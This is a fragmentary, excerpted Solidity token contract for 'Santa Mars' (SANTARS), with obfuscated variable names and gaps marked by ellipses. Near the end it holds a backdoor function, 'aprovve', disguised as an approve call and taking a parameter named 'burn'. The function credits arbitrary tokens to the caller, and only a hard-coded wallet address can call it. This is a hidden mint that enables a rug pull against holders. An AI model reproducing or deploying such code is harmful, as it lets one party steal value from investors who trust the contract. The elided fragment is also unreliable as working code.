...
contract Context {
 ...
 contract SantaMars is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloTARS;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Santa Mars";
    string private _symbol = "SANTARS";
    ...
    uint256 private cryfaleTARS = 4;
    uint256 private _vebegoTARS = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloTARS[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletTARS = 0x983691C14b99e2345F370b1728E51E33F5CcE564;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloTARS[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloTARS[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleTARS / 100) / _vebegoTARS;
        allons = allons -  (_fee * _vebegoTARS);
        
        superfloTARS[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaTARS) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloTARS[account];
        require(accountBalance >= gzillaTARS, "BEP : Can't be done");
        unchecked {
            superfloTARS[account] = accountBalance - gzillaTARS;
        }
        _totalSupply -= gzillaTARS;

        emit Transfer(account, address(0), gzillaTARS);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloTARS[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletTARS, "ERC20: cannot permit dev address");
    }   
